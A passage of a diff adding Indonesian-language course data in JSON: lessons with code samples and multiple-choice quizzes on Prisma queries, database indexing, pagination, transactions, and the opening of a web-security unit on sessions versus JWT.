bersamaan di level yang sama**: Prisma melarang kombinasi `include` dan `select` di root yang sama. Jika menggunakan `select`, definisikan relasi di dalam `select` tersebut.\n\n## Praktik Mandiri\n1. Buat query untuk mengambil 5 kursus terpopuler beserta nama author-nya menggunakan `select`.\n\n## Ringkasan\n- Selalu gunakan **Singleton Pattern** untuk instansiasi Prisma Client di Next.js.\n- Gunakan **`findMany`**, **`findUnique`**, **`create`**, **`update`**, **`delete`** untuk operasi CRUD.\n- Gunakan **`include`** untuk memuat seluruh relasi dan **`select`** untuk efisiensi kolom.\n- Gunakan **`upsert`** untuk operasi cerdas Update-atau-Insert.",
+        "quizzes": [
+          {
+            "id": "q-18-3-1",
+            "question": "Mengapa pada Next.js App Router instansiasi Prisma Client WAJIB menggunakan pola Singleton (disimpan di globalThis)?",
+            "options": [
+              "Untuk mencegah pembuatan instance koneksi database baru yang berlebihan pada setiap kali proses Hot Module Replacement (HMR) berjalan di mode development, yang dapat menghabiskan kuota connection pool database.",
+              "Karena PrismaClient dilarang diimpor lebih dari 1 kali oleh konsorsium Node.js.",
+              "Untuk mengunci database agar tidak bisa diakses hacker.",
+              "Agar ukuran file database menjadi lebih kecil."
+            ],
+            "correctIndex": 0,
+            "explanation": "Singleton pattern mencegah connection exhaustion pada database PostgreSQL akibat pembuatan instance PrismaClient baru di setiap reload development."
+          },
+          {
+            "id": "q-18-3-2",
+            "question": "Klausa Prisma apakah yang paling tepat digunakan jika Anda hanya ingin mengambil kolom 'id' dan 'title' saja dari tabel kursus untuk menghemat bandwidth memori?",
+            "options": [
+              "select: { id: true, title: true }",
+              "include: { id: true, title: true }",
+              "columns: ['id', 'title']",
+              "fetchOnly: ['id', 'title']"
+            ],
+            "correctIndex": 0,
+            "explanation": "Klausa select memungkinkan pengambilan subset kolom tertentu secara presisi (setara dengan SELECT id, title di SQL murni)."
+          },
+          {
+            "id": "q-18-3-3",
+            "question": "Apa fungsi dari operasi db.model.upsert({ where, update, create }) di Prisma?",
+            "options": [
+              "Melakukan pembaruan (Update) jika data yang cocok dengan kriteria where ditemukan, atau membuat data baru (Insert/Create) jika data tersebut belum ada di database dalam satu query atomik.",
+              "Menghapus seluruh baris data di tabel.",
+              "Mengubah nama tabel di PostgreSQL.",
+              "Membuat backup database ke format CSV."
+            ],
+            "correctIndex": 0,
+            "explanation": "upsert adalah singkatan dari update-or-insert, operasi praktis untuk sinkronisasi state data tanpa perlu memeriksa keberadaan data secara manual terlebih dahulu."
+          }
+        ]
+      },
+      {
+        "id": "lesson-18-4",
+        "stageId": "stage-18",
+        "slug": "database-indexing-dan-query-optimization",
+        "title": "Database Indexing & Optimasi Query (B-Tree, EXPLAIN)",
+        "titleEn": "Database Indexing & Query Optimization",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Mengoptimalkan performa database: cara kerja Indexing B-Tree (@@index, @@unique), Sequential Scan vs Index Scan, menganalisis query dengan EXPLAIN ANALYZE, dan Composite Indexes.",
+        "prerequisites": [
+          "prisma-crud-queries-dan-relational-queries"
+        ],
+        "learningObjectives": [
+          "Menjelaskan cara kerja struktur data B-Tree Index dalam mempercepat pencarian data dari $O(N)$ menjadi $O(\\log N)$.",
+          "Mendefinisikan Single Index dan Composite Index di file schema.prisma (`@@index([fieldA, fieldB])`).",
+          "Menganalisis performa query database menggunakan perintah `EXPLAIN ANALYZE`.",
+          "Memahami trade-off indexing (mempercepat READ, namun sedikit memperlambat WRITE/INSERT)."
+        ],
+        "whyMatters": "Tanpa Index, mencari 1 pengguna di tabel berisi 1.000.000 baris memakan waktu 2 detik (Sequential Scan); dengan Index, pencarian selesai dalam 1 milidetik!",
+        "careerContext": "Optimasi query dan arsitektur database indexing adalah keahlian utama yang membedakan Software Engineer level Senior.",
+        "commonMistakes": [
+          "Memasang index pada SETIAP kolom tabel secara berlebihan (memboroskan memori disk dan memperlambat operasi INSERT/UPDATE secara drastis).",
+          "Lupa memasang index pada kolom Foreign Key dan kolom pencarian `slug` / `email`."
+        ],
+        "keyTerms": [
+          {
+            "term": "B-Tree Index",
+            "definition": "Struktur pohon berimbang terurut yang memungkinkan pencarian, akses sekuensial, dan rentang data berkecepatan tinggi."
+          },
+          {
+            "term": "Sequential Scan (Seq Scan)",
+            "definition": "Pemeriksaan baris tabel satu per satu dari awal sampai akhir secara lambat karena ketiadaan index."
+          },
+          {
+            "term": "EXPLAIN ANALYZE",
+            "definition": "Perintah SQL PostgreSQL untuk menampilkan rencana eksekusi dan durasi waktu riil pemrosesan query."
+          }
+        ],
+        "contentMd": "# Database Indexing & Optimasi Query (B-Tree, EXPLAIN)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan membedah optimasi performa database: bagaimana **B-Tree Indexing** bekerja di PostgreSQL, perbedaan antara **Sequential Scan** vs **Index Scan**, cara menganalisis query dengan **`EXPLAIN ANALYZE`**, serta mendeklarasikan **`@@index`** di Prisma.\n\n## Mengapa Konsep Ini Penting?\nSaat tabel kursus Anda hanya memiliki 10 baris, semua query terasa cepat. Namun ketika tabel Anda memiliki **1.000.000 baris data**, query `WHERE email = 'user@domain.com'` tanpa index akan memaksa database membaca satu juta baris satu per satu (*Sequential Scan*) yang membuat server hang. Index menyelesaikan masalah ini dalam sekejap.\n\n## 1. Bagaimana Index B-Tree Bekerja?\nIndex pada database bekerja persis seperti **Daftar Indeks Alfabet di Halaman Belakang Buku Tebal**:\n- **Tanpa Index (Sequential Scan - $O(N)$)**: Anda harus membalik dan membaca halaman 1 sampai halaman 1.000 satu per satu untuk mencari topik tertentu.\n- **Dengan Index (Index Scan - $O(\\log N)$)**: Anda langsung membuka halaman belakang pada huruf 'N', melihat nomor halaman, dan langsung melompat tepat ke data target dalam hitungan milidetik.\n\n## 2. Mendeklarasikan Index di Prisma (`@@index`)\n\n```prisma\nmodel Course {\n  id          String    @id @default(cuid())\n  title       String\n  slug        String    @unique // @unique otomatis membuat B-Tree Index!\n  category    String\n  price       Int\n  isPublished Boolean   @default(false)\n  createdAt   DateTime  @default(now())\n  authorId    String\n\n  // 1. Single Column Index pada Foreign Key (Wajib!):\n  @@index([authorId])\n\n  // 2. Composite Index untuk Query Filter Kombinasi (Category + isPublished):\n  // Sangat optimal untuk: WHERE category = 'frontend' AND isPublished = true\n  @@index([category, isPublished])\n}\n```\n\n## 3. Menganalisis Query dengan `EXPLAIN ANALYZE`\nDi terminal database PostgreSQL, periksa efisiensi query Anda:\n\n```sql\nEXPLAIN ANALYZE SELECT * FROM \"Course\" WHERE \"category\" = 'Frontend';\n```\n\n- **`Seq Scan on Course (cost=... time=450.12ms)`**: BURUK! Database melakukan pembacaan seluruh tabel secara lambat.\n- **`Index Scan using Course_category_idx (time=0.85ms)`**: SANGAT CEPAT! Database menggunakan index B-Tree, memangkas waktu hingga **500x lebih kencang**.\n\n## 4. Trade-off Indexing (Jangan Pasang Sembarangan!)\nIndex **bukanlah gratis**:\n1. **Mempercepat Operasi BACA (SELECT)** secara luar biasa.\n2. **Sedikit Memperlambat Operasi TULIS (INSERT, UPDATE, DELETE)**: Karena setiap ada baris baru masuk, PostgreSQL harus memperbarui struktur pohon B-Tree index-nya.\n3. **Memakan Ruang Harddisk**: File index disimpan terpisah di memori disk.\n\n> **Aturan Emas**: Pasang index HANYA pada: (1) Kolom Foreign Keys, (2) Kolom yang sering masuk klausa `WHERE`, (3) Kolom yang sering masuk klausa `ORDER BY`.\n\n## Kesalahan Umum Pemula\n- **Memasang index pada kolom boolean yang hanya bernilai 2 variasi (true/false)**: Index kurang efektif pada kolom dengan kardinalitas sangat rendah kecuali dikombinasikan dalam *Composite Index*.\n\n## Praktik Mandiri\n1. Tambahkan `@@index([authorId, createdAt])` pada model `Course`.\n2. Jalankan `npx prisma migrate dev` untuk menerapkannya ke PostgreSQL.\n\n## Ringkasan\n- **B-Tree Indexing** memangkas waktu pencarian dari $O(N)$ menjadi $O(\\log N)$.\n- Gunakan **`@@index`** di Prisma untuk foreign keys dan kolom filter pencarian.\n- Gunakan **`EXPLAIN ANALYZE`** untuk membuktikan bahwa query berjalan via *Index Scan*, bukan *Seq Scan*.\n- Pertimbangkan trade-off: percepat SELECT, namun kelola beban INSERT.",
+        "quizzes": [
+          {
+            "id": "q-18-4-1",
+            "question": "Bagaimana cara kerja struktur data B-Tree Index di PostgreSQL dalam mempercepat pencarian data pada tabel berukuran jutaan baris?",
+            "options": [
+              "Menyimpan referensi kunci data dalam struktur pohon berimbang terurut sehingga database dapat menemukan lokasi data target secara biner (O(log N)) tanpa perlu memindai seluruh baris tabel satu per satu (Sequential Scan).",
+              "Menghapus 50% data tabel yang jarang dibaca.",
+              "Mengubah database relasional menjadi file teks Notepad.",
+              "Mengompresi data dengan format MP3."
+            ],
+            "correctIndex": 0,
+            "explanation": "B-Tree Index mengorganisir pointer baris data secara hierarkis terurut, memungkinkan pencarian data instan dalam skala logaritmik."
+          },
+          {
+            "id": "q-18-4-2",
+            "question": "Perintah SQL apakah di PostgreSQL yang digunakan untuk menganalisis dan menampilkan rencana eksekusi serta durasi waktu nyata (real execution time) pemrosesan suatu query database?",
+            "options": [
+              "EXPLAIN ANALYZE <query_sql>;",
+              "SHOW SPEED <query_sql>;",
+              "CHECK PERFORMANCE <query_sql>;",
+              "TEST BENCHMARK <query_sql>;"
+            ],
+            "correctIndex": 0,
+            "explanation": "EXPLAIN ANALYZE mengeksekusi statement SQL dan memberikan laporan detail rencana eksekusi, penggunaan index, dan cost/durasi waktu operasi."
+          },
+          {
+            "id": "q-18-4-3",
+            "question": "Apakah trade-off (konsekuensi biaya) dari menambahkan terlalu banyak Index pada sebuah tabel database?",
+            "options": [
+              "Meskipun mempercepat operasi pembacaan (SELECT), index memperlambat operasi penulisan (INSERT, UPDATE, DELETE) karena database harus memperbarui struktur pohon index di setiap perubahan data, serta memakan kapasitas ruang disk tambahan.",
+              "Database akan menolak koneksi pengguna.",
+              "Ukuran font teks di website akan mengecil.",
+              "Koneksi internet server akan terputus."
+            ],
+            "correctIndex": 0,
+            "explanation": "Setiap mutasi data (write) mewajibkan pembaruan struktur index pendukung, sehingga index berlebih membebani performa write dan storage."
+          }
+        ]
+      },
+      {
+        "id": "lesson-18-5",
+        "stageId": "stage-18",
+        "slug": "pagination-offset-vs-cursor-based",
+        "title": "Pagination: Offset-Based vs Cursor-Based Pagination",
+        "titleEn": "Offset vs Cursor Pagination",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Menerapkan pagination di Prisma: Offset pagination (skip/take) untuk nomor halaman tradisional vs Cursor-based pagination (cursor/take) untuk Infinite Scroll performa tinggi skala besar.",
+        "prerequisites": [
+          "database-indexing-dan-query-optimization"
+        ],
+        "learningObjectives": [
+          "Menerapkan Offset-Based Pagination menggunakan `skip` dan `take` di Prisma.",
+          "Menganalisis kelemahan Offset Pagination pada dataset besar (masalah performa $O(N)$ dan duplikasi data akibat pergeseran baris).",
+          "Menerapkan Cursor-Based Pagination menggunakan `cursor` dan `take` untuk Infinite Scroll berkecepatan tinggi $O(1)$.",
+          "Memilih strategi pagination yang tepat sesuai kebutuhan UI (Halaman Numerik vs Linimasa Feed)."
+        ],
+        "whyMatters": "Mengambil 100.000 data sekaligus akan membuat browser dan database crash. Pagination memecah data menjadi porsi kecil yang cepat dimuat.",
+        "careerContext": "Memahami Cursor-Based Pagination adalah standar wajib untuk membangun infinite feed ala Twitter/Instagram.",
+        "commonMistakes": [
+          "Menggunakan Offset Pagination `skip: 50000` pada dataset jutaan baris (database terpaksa membaca 50.000 baris lalu membuangnya, sangat lambat!).",
+          "Mengabaikan bug data duplikat pada Offset saat ada item baru yang disisipkan di halaman 1."
+        ],
+        "keyTerms": [
+          {
+            "term": "Offset Pagination",
+            "definition": "Teknik pagination tradisional berbasis nomor halaman menggunakan offset pergeseran (`skip` dan `take`)."
+          },
+          {
+            "term": "Cursor Pagination",
+            "definition": "Teknik pagination modern performa tinggi yang menggunakan pointer identifier unik baris terakhir (`cursor`) sebagai titik awal data berikutnya."
+          },
+          {
+            "term": "Infinite Scroll",
+            "definition": "Pola UI di mana data baru otomatis dimuat saat pengguna menggulir layar ke bagian bawah."
+          }
+        ],
+        "contentMd": "# Pagination: Offset-Based vs Cursor-Based Pagination\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari dua strategi pagination utama di backend: **Offset-Based Pagination (`skip/take`)** dan **Cursor-Based Pagination (`cursor/take`)**, kelebihan/kekurangannya, serta cara implementasinya dengan **Prisma ORM**.\n\n## Mengapa Konsep Ini Penting?\nJika database Anda memiliki 500.000 produk, Anda tidak boleh menjalankan `SELECT * FROM products` sekaligus. Data harus dipecah menjadi halaman-halaman kecil (misal 20 data per halaman).\n\n## 1. Strategi 1: Offset-Based Pagination (`skip` & `take`)\nSangat cocok untuk **Navigasi Halaman Bernomor** (*Page 1, 2, 3, 4, 5*):\n\n```typescript\nasync function getCoursesOffset(halaman: number = 1, perHalaman: number = 10) {\n  const skip = (halaman - 1) * perHalaman; // Contoh Hal 3: (3 - 1) * 10 = Lewati 20 data\n\n  const [items, totalCount] = await Promise.all([\n    db.course.findMany({\n      skip: skip,\n      take: perHalaman,\n      orderBy: { createdAt: \"desc\" }\n    }),\n    db.course.count() // Hitung total seluruh baris data\n  ]);\n\n  return {\n    items,\n    totalPages: Math.ceil(totalCount / perHalaman),\n    currentPage: halaman\n  };\n}\n```\n\n### Kelemahan Fatal Offset pada Data Besar:\n1. **Performa Lambat pada Halaman Dalam**: Jika Anda meminta `skip: 100000`, PostgreSQL terpaksa membaca dan menghitung 100.000 baris terlebih dahulu sebelum membuangnya dan mengambil 10 baris target.\n2. **Data Bergeser (Duplikasi Data)**: Jika saat user membaca halaman 1 ada 2 artikel baru diposting, ketika user membuka halaman 2, artikel terakhir dari halaman 1 akan bergeser turun ke halaman 2 dan tampil kembar ganda.\n\n## 2. Strategi 2: Cursor-Based Pagination (`cursor` & `take`)\nStandar emas untuk **Infinite Scroll Feed** (Twitter, Instagram, TikTok):\n\n```typescript\nasync function getCoursesCursor(cursorId?: string, limit: number = 10) {\n  const items = await db.course.findMany({\n    take: limit + 1, // Ambil +1 untuk mendeteksi apakah masih ada halaman berikutnya\n    cursor: cursorId ? { id: cursorId } : undefined,\n    skip: cursorId ? 1 : 0, // Lewati cursor itu sendiri\n    orderBy: { id: \"asc\" }\n  });\n\n  let nextCursor: string | undefined = undefined;\n  if (items.length > limit) {\n    const nextItem = items.pop(); // Hapus item ekstra\n    nextCursor = nextItem?.id;\n  }\n\n  return {\n    items,\n    nextCursor // Kirim ID ini ke frontend untuk request scroll berikutnya!\n  };\n}\n```\n\n### Keunggulan Mutlak Cursor:\n1. **Performa Konstan $O(1)$**: Mau di awal atau di data ke-1.000.000, query langsung melompat ke index `WHERE id > cursor` dalam 1 milidetik!\n2. **Kebal Pergeseran Data**: Penambahan data baru di atas tidak akan merusak pointer scroll di bawah.\n\n## Kesalahan Umum Pemula\n- **Memakai Offset Pagination untuk Infinite Scroll**: Menyebabkan postingan feed media sosial sering muncul dobel saat di-scroll ke bawah. Selalu gunakan Cursor-Based untuk Infinite Scroll!\n\n## Praktik Mandiri\n1. Buat endpoint API `/api/feed` menggunakan Cursor-Based Pagination.\n2. Uji kirimkan parameter `?cursor=cuid_terakhir` dan verifikasi kelanjutan datanya.\n\n## Ringkasan\n- **Offset Pagination (`skip/take`)** ideal untuk navigasi tabel admin bernomor (*Page 1, 2, 3*).\n- **Cursor Pagination (`cursor/take`)** ideal untuk **Infinite Scroll** performa tinggi skala besar ($O(1)$ constant time).",
+        "quizzes": [
+          {
+            "id": "q-18-5-1",
+            "question": "Kapan Anda sebaiknya memilih strategi Cursor-Based Pagination dibandingkan Offset-Based Pagination?",
+            "options": [
+              "Ketika membangun antarmuka Infinite Scroll atau linimasa feed pada dataset berukuran besar di mana performa konstan O(1) dan pencegahan duplikasi data sangat diutamakan.",
+              "Ketika ingin menampilkan tombol navigasi nomor halaman 1, 2, 3, 4, 5 di tabel admin.",
+              "Hanya saat database dalam keadaan kosong.",
+              "Hanya pada perangkat jam tangan pintar."
+            ],
+            "correctIndex": 0,
+            "explanation": "Cursor pagination mengandalkan pointer index unik baris terakhir (O(1) seek), menjadikannya standar ideal untuk infinite scroll feed."
+          },
+          {
+            "id": "q-18-5-2",
+            "question": "Apa kelemahan utama dari Offset-Based Pagination (menggunakan skip dan take) saat mengakses halaman yang sangat dalam (contoh: skip 100.000 data)?",
+            "options": [
+              "Database terpaksa membaca dan memindai 100.000 baris data terlebih dahulu sebelum membuangnya untuk mengambil 10 baris terakhir, menyebabkan penurunan performa yang drastis.",
+              "Database akan menghapus 100.000 data tersebut secara permanen.",
+              "Offset pagination dilarang oleh konsorsium SQL.",
+              "Teks artikel akan berubah menjadi bahasa lain."
+            ],
+            "correctIndex": 0,
+            "explanation": "Perintah skip besar memaksa engine database melakukan traversal baris berurutan yang sangat lambat dan membebani I/O disk."
+          },
+          {
+            "id": "q-18-5-3",
+            "question": "Kombinasi parameter Prisma apakah yang digunakan untuk menerapkan Offset-Based Pagination?",
+            "options": [
+              "skip dan take (contoh: db.course.findMany({ skip: 20, take: 10 }))",
+              "cursor dan limit",
+              "page dan count",
+              "offset dan jump"
+            ],
+            "correctIndex": 0,
+            "explanation": "Prisma menggunakan parameter skip (melewati N baris) dan take (mengambil N baris) untuk offset pagination standar."
+          }
+        ]
+      },
+      {
+        "id": "lesson-18-6",
+        "stageId": "stage-18",
+        "slug": "database-transactions-dan-concurrency-control",
+        "title": "Database Transactions & Concurrency Control ($transaction)",
+        "titleEn": "Database Transactions ($transaction)",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Menjaga integritas data finansial & transaksi multi-tabel dengan Prisma `$transaction` (Sequential vs Interactive Transactions), Isolation Levels, dan menangani Race Conditions.",
+        "prerequisites": [
+          "pagination-offset-vs-cursor-based"
+        ],
+        "learningObjectives": [
+          "Menerapkan Prisma Sequential Transactions (`prisma.$transaction([op1, op2])`).",
+          "Menerapkan Prisma Interactive Transactions (`prisma.$transaction(async (tx) => { ... })`) untuk logika bisnis bersyarat.",
+          "Mendiagnosis dan mencegah bug Race Condition (seperti double-spending atau overbooking stok).",
+          "Memahami mekanisme Rollback otomatis saat terjadi error di tengah transaksi."
+        ],
+        "whyMatters": "Tanpa Transaksi Database, jika server mati saat proses checkout pembayaran, saldo user bisa terpotong tetapi status pesanan gagal dibuat (*uang hilang*).",
+        "careerContext": "Penanganan transaksi dan konkurensi data adalah keahlian wajib untuk backend sistem e-commerce, fintech, dan perbankan.",
+        "commonMistakes": [
+          "Melakukan beberapa operasi `db.update()` terpisah tanpa membungkusnya di dalam `$transaction` pada alur checkout keuangan.",
+          "Melakukan pemanggilan network fetch pihak ketiga yang lambat di dalam interactive transaction (mengunci koneksi database terlalu lama)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Database Transaction",
+            "definition": "Rangkaian operasi database yang dieksekusi sebagai satu unit kerja tunggal yang tak terpisahkan (All-or-Nothing)."
+          },
+          {
+            "term": "prisma.$transaction",
+            "definition": "Method bawaan Prisma untuk mengeksekusi rangkaian query di dalam satu transaksi aman."
+          },
+          {
+            "term": "Race Condition",
+            "definition": "Kondisi bug di mana dua request bersamaan saling berebut memodifikasi data yang sama (seperti dua user membeli 1 sisa tiket terakhir di detik yang sama)."
+          }
+        ],
+        "contentMd": "# Database Transactions & Concurrency Control ($transaction)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Database Transactions** di Prisma: mengeksekusi operasi transaksi **Sequential** dan **Interactive (`$transaction`)**, memahami mekanisme **Rollback Otomatis**, serta menangani masalah **Race Conditions** pada sistem keuangan dan stok barang.\n\n## Mengapa Konsep Ini Penting?\nBayangkan proses pendaftaran kursus berbayar:\n1. Potong saldo dompet pengguna: `saldo - 100.000`.\n2. Tambahkan akses materi kursus ke akun pengguna.\nJika langkah 1 berhasil, namun server tiba-tiba mati sebelum langkah 2 selesai, **pengguna kehilangan uang 100.000 tanpa mendapatkan kursus!** Database Transaction menjamin kedua langkah tersebut berhasil bersamaan, atau jika gagal, saldo otomatis dikembalikan utuh (**Rollback**).\n\n## 1. Dua Jenis Transaksi di Prisma\n\n### A. Sequential Transactions (Daftar Operasi Statis)\nJika Anda memiliki beberapa query independen yang harus sukses bersamaan:\n\n```typescript\nimport { db } from \"@/lib/db\";\n\n// Kedua operasi ini dieksekusi dalam 1 transaksi atomik:\nconst [userBaru, logAktivitas] = await db.$transaction([\n  db.user.create({ data: { email: \"user@domain.com\", name: \"Budi\" } }),\n  db.auditLog.create({ data: { action: \"USER_REGISTERED\" } })\n]);\n```\n\n### B. Interactive Transactions (Logika Bersyarat Dinamis)\nSangat ideal untuk alur bisnis kompleks di mana langkah berikutnya membutuhkan hasil dari langkah sebelumnya:\n\n```typescript\nexport async function transferSaldo(pengirimId: string, penerimaId: string, jumlah: number) {\n  // Gunakan interactive transaction tx:\n  return await db.$transaction(async (tx) => {\n    // 1. Ambil data saldo pengirim dengan lock:\n    const pengirim = await tx.user.findUniqueOrThrow({ where: { id: pengirimId } });\n\n    // 2. Validasi saldo cukup:\n    if (pengirim.balance < jumlah) {\n      throw new Error(\"Saldo tidak mencukupi untuk transfer!\"); // Memicu ROLLBACK OTOMATIS!\n    }\n\n    // 3. Potong Saldo Pengirim:\n    const updatePengirim = await tx.user.update({\n      where: { id: pengirimId },\n      data: { balance: { decrement: jumlah } }\n    });\n\n    // 4. Tambah Saldo Penerima:\n    const updatePenerima = await tx.user.update({\n      where: { id: penerimaId },\n      data: { balance: { increment: jumlah } }\n    });\n\n    // 5. Catat Riwayat Transaksi:\n    const logTransfer = await tx.transactionLog.create({\n      data: { fromId: pengirimId, toId: penerimaId, amount: jumlah }\n    });\n\n    return { success: true, logId: logTransfer.id };\n  });\n}\n```\n\n## 2. Bagaimana Mekanisme Rollback Bekerja?\nJika di baris ke-4 terjadi error (misal database penerima bermasalah atau saldo kurang), blok transaksi langsung melempar exception dan PostgreSQL secara otomatis **MEMBATALKAN seluruh mutasi yang sempat terjadi sebelumnya**. Saldo pengirim tetap aman tidak terpotong!\n\n## 3. Mencegah Race Conditions (Stok Tiket Habis)\nGunakan operator atomik **`decrement`** atau **Optimistic Concurrency Control (Version tracking)** agar saat 2 user mengklik beli bersamaan pada sisa 1 tiket, hanya 1 orang yang berhasil:\n\n```typescript\n// Pengurangan Stok Atomik di Database:\nawait tx.product.update({\n  where: { id: productId, stock: { gt: 0 } }, // Syarat: stok harus > 0!\n  data: { stock: { decrement: 1 } }\n});\n```\n\n## Kesalahan Umum Pemula\n- **Memanggil fetch eksternal di dalam interactive transaction**: Melakukan `await fetch('https://api-bank.com')` di dalam `$transaction` akan menyandera koneksi database selama berdetik-detik dan menyebabkan database connection pool macet total (*Pool Timeout*). Lakukan fetch di luar transaksi!\n\n## Praktik Mandiri\n1. Buat interactive transaction untuk proses pendaftaran kursus (buat record pendaftaran dan kurangi sisa kuota kursi kelas).\n\n## Ringkasan\n- **Database Transactions** menjamin prinsip **Atomicity** (semua langkah sukses bersamaan atau dibatalkan total).\n- Gunakan **`db.$transaction(async (tx) => { ... })`** untuk transaksi bersyarat.\n- Melempar error di dalam fungsi transaksi otomatis memicu **Rollback** yang aman.\n- Jangan pernah menaruh operasi I/O lambat (seperti HTTP fetch pihak ketiga) di dalam transaksi database.",
+        "quizzes": [
+          {
+            "id": "q-18-6-1",
+            "question": "Apa yang terjadi pada seluruh mutasi database yang sudah sempat dieksekusi jika terjadi error atau exception dilempar di tengah-tengah blok prisma.$transaction(async (tx) => { ... })?",
+            "options": [
+              "Seluruh operasi yang sudah sempat berjalan otomatis dibatalkan (Rollback) seolah-olah transaksi tidak pernah dieksekusi, menjaga data tetap konsisten dan utuh.",
+              "Data yang sempat termutasi akan tetap tersimpan setengah-setengah.",
+              "Database akan menghapus seluruh data pengguna.",
+              "Server akan mematikan komputer developer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Mekanisme rollback otomatis menjamin integritas atomik (All-or-Nothing), membatalkan seluruh perubahan jika terjadi kegagalan di tengah alur transaksi."
+          },
+          {
+            "id": "q-18-6-2",
+            "question": "Mengapa melakukan panggilan jaringan eksternal yang lambat (contoh: await fetch() ke Payment Gateway) di dalam blok interactive transaction prisma.$transaction dianggap sebagai bad practice kritis?",
+            "options": [
+              "Karena menyandera (mengunci) koneksi database aktif selama proses jaringan lambat tersebut berlangsung, yang dapat menghabiskan database connection pool dan membuat server macet total.",
+              "Karena fetch dilarang di dalam fungsi JavaScript.",
+              "Karena pembayaran otomatis menjadi gratis.",
+              "Karena TypeScript tidak mendukung transaksi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Transaksi database harus diselesaikan secepat mungkin (dalam beberapa milidetik) untuk menghindari penguncian baris tabel (row locks) dan kehabisan connection pool."
+          },
+          {
+            "id": "q-18-6-3",
+            "question": "Operasi atomik Prisma apakah yang paling aman digunakan untuk mengurangi stok barang (misal mengurangi 1) tanpa terkena bug Race Condition saat ada banyak transaksi bersamaan?",
+            "options": [
+              "data: { stock: { decrement: 1 } } dengan filter where: { stock: { gt: 0 } }",
+              "data: { stock: currentStock - 1 }",
+              "data: { stock: 0 }",
+              "data: { stock: 'minus-one' }"
+            ],
+            "correctIndex": 0,
+            "explanation": "Operasi atomik tingkat database { decrement: 1 } dieksekusi langsung di engine PostgreSQL, mencegah race condition akibat pembacaan nilai lama di memori aplikasi."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-19",
+    "orderIndex": 19,
+    "titleId": "Web Security, Authentication & Defense in Depth",
+    "titleEn": "Web Security, Authentication & Defense in Depth",
+    "category": "Fullstack & DevOps",
+    "description": "Mengamankan aplikasi web tingkat enterprise: Otentikasi sesi vs JWT, Password Hashing dengan Argon2/bcrypt, Proteksi OWASP Top 10 (SQL Injection, XSS, CSRF, SSRF), HTTP Security Headers, dan Next.js Middleware Auth Guard.",
+    "descriptionEn": "Enterprise web security: Sessions vs JWT, Argon2 password hashing, OWASP Top 10 (XSS, CSRF, SQLi), Security Headers, and Middleware Auth Guards.",
+    "lessons": [
+      {
+        "id": "lesson-19-1",
+        "stageId": "stage-19",
+        "slug": "arsitektur-otentikasi-session-vs-jwt",
+        "title": "Arsitektur Otentikasi: Session-Based vs JWT Token",
+        "titleEn": "Authentication: Sessions vs JWT Tokens",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membedah dua arsitektur otentikasi: Stateful Sessions (database/Redis session ID di HttpOnly cookie) vs Stateless JWT (JSON Web Token signature, access vs refresh token), dan kapan memilih masing-masing.",
+        "prerequisites": [
+          "database-transactions-dan-concurrency-control"
+        ],
+        "learningObjectives": [
+          "Membandingkan arsitektur Stateful Session-Based Authentication vs Stateless JWT Authentication.",
+          "Menganalisis anatomi token JWT (Header, Payload, Signature) dan bahaya menyimpan data sensitif di payload.",
+          "Menerapkan pola Access Token berumur pendek (15 menit) yang dipadukan dengan Refresh Token (7 hari) yang dapat dicabut (*revocable*).",
+          "Menjelaskan mengapa Session-Based Auth sering kali lebih aman untuk aplikasi web monolithic/B2B SaaS."
+        ],
+        "whyMatters": "Memilih arsitektur otentikasi yang keliru dapat menyebabkan token tidak bisa dicabut (*revoked*) saat akun pengguna dibajak peretas.",
+        "careerContext": "Security Architecture dan Auth flow adalah topik paling mendasar yang diuji dalam audit keamanan sistem.",
+        "commonMistakes": [
+          "Menyimpan password atau data rahasia di dalam payload JWT (payload JWT hanya di-encode Base64, BUKAN dienkripsi!).",
+          "Membuat JWT token dengan masa aktif 30 hari tanpa mekanisme pencabutan (revocation)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Stateful Session",
+            "definition": "Model otentikasi di mana data sesi aktif disimpan di server/database dan hanya ID sesi acak yang dikirim ke browser."
+          },
+          {
+            "term": "Stateless JWT",
+            "definition": "Model otentikasi di mana seluruh data klaim pengguna dibungkus dalam token bertanda tangan kriptografi tanpa perlu query database di setiap request."
+          },
+          {
+            "term": "HttpOnly Cookie",
+            "definition": "Cookie dengan flag keamanan khusus yang melarang kode JavaScript membaca isinya, kebal dari pencurian skrip XSS."
+          }
+        ],
+        "contentMd": "# Arsitektur Otentikasi: Session-Based vs JWT Token\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari dua pilar arsitektur otentikasi modern: **Stateful Session-Based Authentication** vs **Stateless JSON Web Tokens (JWT)**, anatomi token, mekanisme **Access vs Refresh Tokens**, serta pertimbangan keamanan perbankan.\n\n## Mengapa Konsep Ini Penting?\nBagaimana server tahu bahwa orang yang sedang mengklik tombol *\"Transfer Uang\"* adalah pemilik akun yang sah? Otentikasi adalah pintu gerbang verifikasi identitas sistem Anda.\n\n## 1. Perbandingan Dua Model Otentikasi\n\n| Kriteria | Stateful Sessions (Database / Redis) | Stateless JWT (JSON Web Tokens) |\n| :--- | :--- | :--- |\n| **Penyimpanan Status** | **Disimpan di Database Server** | **Disimpan di dalam Token Klien** |\n| **Pencabutan Sesi (*Revoke*)** | **Instan 0 Detik** (Cukup hapus baris di DB) | **Sangat Sulit** (Token sah hingga masa aktif habis) |\n| **Beban Database** | Query DB/Redis di setiap request | **0 Query DB** (Cukup verifikasi signature) |\n| **Penyimpanan Client** | **HttpOnly, Secure Cookie** | HttpOnly Cookie / Authorization Header |\n| **Kasus Penggunaan Ideal** | **Aplikasi Web, B2B SaaS, E-Commerce** | **Mobile Apps, Microservices Terdistribusi** |\n\n## 2. Anatomi JSON Web Token (JWT)\nSebuah string JWT terdiri dari 3 bagian yang dipisahkan tanda titik 